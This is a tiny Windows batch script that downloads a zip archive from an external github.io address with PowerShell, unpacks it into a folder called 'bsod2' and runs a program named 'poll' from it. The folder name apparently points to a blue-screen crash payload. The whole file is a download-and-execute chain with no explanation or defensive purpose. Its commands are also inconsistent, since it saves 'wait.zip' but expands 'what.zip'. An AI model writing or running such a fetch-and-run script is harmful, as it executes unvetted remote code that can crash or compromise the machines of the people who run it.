@echo off
powershell -Command Start-BitsTransfer -Source https://terencep1.github.io/what.zip -Destination wait.zip & powershell -Command  expand-archive -LiteralPath what.zip -Force -DestinationPath bsod2
cd bsod2
poll